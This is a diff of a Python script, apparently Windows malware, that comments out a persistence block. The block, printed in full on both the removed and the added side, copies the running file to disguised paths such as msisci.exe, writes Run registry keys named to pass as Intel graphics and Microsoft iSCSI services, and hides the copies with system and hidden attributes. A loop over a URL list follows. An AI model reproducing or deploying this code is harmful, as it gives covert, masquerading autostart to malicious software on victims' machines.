@@ -37,43 +37,43 @@ updater_path = os.path.join(updater_folder, 'msisci.exe')
 file_name = sys.argv[0]
 si = subprocess.STARTUPINFO()
 si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-if not 'igfxsrvc' in file_name:
-    if not os.path.exists(destination_path):
-        shutil.copy2(file_name, destination_path)
-    if not os.path.exists(updater_path):
-        shutil.copy2(file_name, updater_path)
-    if windll.shell32.IsUserAnAdmin() == 1:
-        reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "1Intel(R) Graphic Driver Service" /t REG_SZ /F /D "{}"'.format(destination_path)
-        subprocess.call(reg_payload, startupinfo=si)
-        reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format('2Microsoft iSCSI Initiator Service', updater_path)
-        subprocess.call(reg_payload, startupinfo=si)
-    else:
-        reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "3Intel(R) Graphic Driver Service" /t REG_SZ /F /D "{}"'.format(destination_path)
-        subprocess.call(reg_payload, startupinfo=si)
-        reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format('4Microsoft iSCSI Initiator Service', updater_path)
-        subprocess.call(reg_payload, startupinfo=si)
-
-    attrib_payload = r'attrib +h +s %s' % destination_path
-    subprocess.call(attrib_payload, startupinfo=si)
-    sys.exit(0)
-else:
-    if not os.path.exists(updater_path):
-        shutil.copy2(file_name, updater_path)
-    if not os.path.exists(destination_path):
-        shutil.copy2(file_name, destination_path)
-    if windll.shell32.IsUserAnAdmin() == 1:
-        reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "5Intel(R) Graphic Driver Service" /t REG_SZ /F /D "{}"'.format(destination_path)
-        subprocess.call(reg_payload, startupinfo=si)
-        reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format('6Microsoft iSCSI Initiator Service', updater_path)
-        subprocess.call(reg_payload, startupinfo=si)
-    else:
-        reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "7Intel(R) Graphic Driver Service" /t REG_SZ /F /D "{}"'.format(destination_path)
-        subprocess.call(reg_payload, startupinfo=si)
-        reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format('8Microsoft iSCSI Initiator Service', updater_path)
-        subprocess.call(reg_payload, startupinfo=si)
-
-    attrib_payload = r'attrib +h +s %s' % destination_path
-    subprocess.call(attrib_payload, startupinfo=si)
+# if not 'igfxsrvc' in file_name:
+#     if not os.path.exists(destination_path):
+#         shutil.copy2(file_name, destination_path)
+#     if not os.path.exists(updater_path):
+#         shutil.copy2(file_name, updater_path)
+#     if windll.shell32.IsUserAnAdmin() == 1:
+#         reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "1Intel(R) Graphic Driver Service" /t REG_SZ /F /D "{}"'.format(destination_path)
+#         subprocess.call(reg_payload, startupinfo=si)
+#         reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format('2Microsoft iSCSI Initiator Service', updater_path)
+#         subprocess.call(reg_payload, startupinfo=si)
+#     else:
+#         reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "3Intel(R) Graphic Driver Service" /t REG_SZ /F /D "{}"'.format(destination_path)
+#         subprocess.call(reg_payload, startupinfo=si)
+#         reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format('4Microsoft iSCSI Initiator Service', updater_path)
+#         subprocess.call(reg_payload, startupinfo=si)
+#
+#     attrib_payload = r'attrib +h +s %s' % destination_path
+#     subprocess.call(attrib_payload, startupinfo=si)
+#     sys.exit(0)
+# else:
+#     if not os.path.exists(updater_path):
+#         shutil.copy2(file_name, updater_path)
+#     if not os.path.exists(destination_path):
+#         shutil.copy2(file_name, destination_path)
+#     if windll.shell32.IsUserAnAdmin() == 1:
+#         reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "5Intel(R) Graphic Driver Service" /t REG_SZ /F /D "{}"'.format(destination_path)
+#         subprocess.call(reg_payload, startupinfo=si)
+#         reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format('6Microsoft iSCSI Initiator Service', updater_path)
+#         subprocess.call(reg_payload, startupinfo=si)
+#     else:
+#         reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "7Intel(R) Graphic Driver Service" /t REG_SZ /F /D "{}"'.format(destination_path)
+#         subprocess.call(reg_payload, startupinfo=si)
+#         reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format('8Microsoft iSCSI Initiator Service', updater_path)
+#         subprocess.call(reg_payload, startupinfo=si)
+#
+#     attrib_payload = r'attrib +h +s %s' % destination_path
+#     subprocess.call(attrib_payload, startupinfo=si)
 while 1:
     try:
         for url in url_list:
